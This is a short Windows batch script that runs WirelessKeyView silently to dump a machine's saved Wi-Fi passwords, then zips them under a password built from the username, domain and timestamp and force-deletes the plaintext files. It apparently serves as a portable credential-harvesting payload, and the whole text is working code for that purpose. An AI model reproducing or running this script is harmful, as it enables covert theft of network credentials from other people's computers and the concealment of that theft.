@echo off
start exe\WirelessKeyView.exe /stext text\WirelessKeyView.txt
timeout 1 >nul
set datetimef=_%username%_%userdomain%__%date:~0,2%_%date:~3,2%_%date:~-4%__%time:~0,2%_%time:~3,2%_%time:~6,2%__%random%
"7-Zip\7z.exe" a -pIncrypted-Zip-File%datetimef% -tzip "text\Incrypted-Zip-File%datetimef%.zip" "text\*.txt"
del "text\*.txt" /s /f /q

